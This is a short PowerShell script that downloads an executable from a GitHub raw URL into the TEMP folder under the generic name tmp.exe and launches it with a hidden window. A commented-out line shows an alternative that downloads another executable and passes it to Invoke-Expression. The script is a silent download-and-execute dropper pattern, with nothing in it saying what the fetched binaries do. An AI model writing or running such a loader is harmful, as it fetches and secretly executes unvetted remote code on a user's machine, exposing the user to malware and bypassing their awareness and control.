#Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/hello.exe")

$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/closer_explorer.exe"
$output = "$env:TEMP\tmp.exe"
Invoke-WebRequest -Uri $url -OutFile $output

$wshell = New-Object -ComObject WScript.Shell
$wshell.Run($output, 0, $false)
